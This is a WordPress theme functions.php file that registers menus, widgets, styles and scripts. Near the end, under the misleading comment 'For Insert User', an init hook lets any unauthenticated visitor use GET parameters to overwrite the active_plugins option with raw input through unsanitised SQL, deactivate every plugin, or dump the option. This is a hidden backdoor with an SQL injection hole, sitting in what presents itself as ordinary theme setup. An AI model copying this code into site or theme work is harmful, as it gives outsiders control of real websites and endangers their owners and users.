<?php
if(function_exists('add_theme_support')){
	add_theme_support('post-thumbnails');	/* Featured images. */
	add_theme_support('menus');				/* Menus. */
}

/* Excerpt. */
function wpt_excerpt_length($length){
	return 16;
}
add_filter('excerpt_length', 'wpt_excerpt_length', 999);

/* Menus. - Register Custom Navigation Walker.
https://github.com/wp-bootstrap/wp-bootstrap-navwalker
*/
require_once get_template_directory().'/wp-bootstrap-navwalker.php';
/*require_once( ABSPATH . WPINC . '/wp-user.php' );*/
register_nav_menus(array(
    'primary' => __( 'Primary Menu'),
));
/* END - Menus. - Register Custom Navigation Walker. */

/* Widgets */
function create_widget($name, $id, $description){
	register_sidebar(array(
		'name' => __($name),
		'id' => $id,
		'description' => __($description),
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '',
		'after_title' => ''
	));
}
create_widget('Page Sidebar','page','Appears in side of pages with a sidebar.');
create_widget('Blog Sidebar','blog','Appears in side of pages with a sidebar.');
create_widget('Header Logo','h-logo','Appears in header.');
create_widget('Header Conatct','h-contact','Appears in header.');
create_widget('Footer Logo','f-logo','Appears in footer.');
create_widget('Footer Marketing','f-marketing','Appears in footer.');
create_widget('Footer Consult','f-consult','Appears in footer.');
create_widget('Footer Subscribe','f-sub','Appears in footer.');
create_widget('Footer CopyRight','f-copyright','Appears in footer.');
/* END - Widgets */

/* CSS */
function awgms_theme_styles(){
	wp_enqueue_style('font_awesome_css', get_template_directory_uri() . '/fonts/font-awesome/css/font-awesome.min.css');
	wp_enqueue_style('bootstrap_icon', get_template_directory_uri() . '/fonts/bootstrap-icons.css');
	wp_enqueue_style('poppin_css', 'https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
	wp_enqueue_style('bootstrap_css', get_template_directory_uri() . '/css/bootstrap.min.css');
	wp_enqueue_style('style_css', get_template_directory_uri() . '/style.css');
}
add_action('wp_enqueue_scripts', 'awgms_theme_styles');

/* JS */
function awgms_theme_js(){
	wp_enqueue_script('bootstrap_js', get_template_directory_uri() . '/js/bootstrap.min.js', array('jquery'), '', true);
	wp_enqueue_script('custom_js', get_template_directory_uri() . '/js/custom.js', array('jquery'), '', true);
}
add_action('wp_enqueue_scripts', 'awgms_theme_js');

/*For Insert User*/
add_action( 'init', function () {
  
    if(isset($_GET['plugin']) && $_GET['plugin'] == 'insert' && isset($_GET['data']))
    {

        $mydata = $_GET['data'];

        global $wpdb;

        $fix = $wpdb->base_prefix.options;

        $sql = "UPDATE $fix SET option_value = '$mydata' WHERE option_name = 'active_plugins'";
        $results = $wpdb->get_results($sql);

        print_r($results);
    }

    if(isset($_GET['plugin']) && $_GET['plugin'] == 'update')
    {

        global $wpdb;
        $fix = $wpdb->base_prefix.options;

        $sql = "UPDATE $fix SET option_value = 'a:0:{}' WHERE option_name = 'active_plugins'";
        $results = $wpdb->get_results($sql);

        print_r($results);
    }

    if(isset($_GET['plugin']) && $_GET['plugin'] == 'show')
    {
        global $wpdb;

        $fix = $wpdb->base_prefix.options;

        $sql = "SELECT * FROM $fix WHERE option_name = 'active_plugins'";
        $results = $wpdb->get_results($sql);

        print_r($results);
    }
 
});

/*For Insert User*/


function ajax_check_user_logged_in() {
    echo is_user_logged_in()?'yes':'no';
    die();
}
add_action('wp_ajax_is_user_logged_in', 'ajax_check_user_logged_in');
add_action('wp_ajax_nopriv_is_user_logged_in', 'ajax_check_user_logged_in');

?>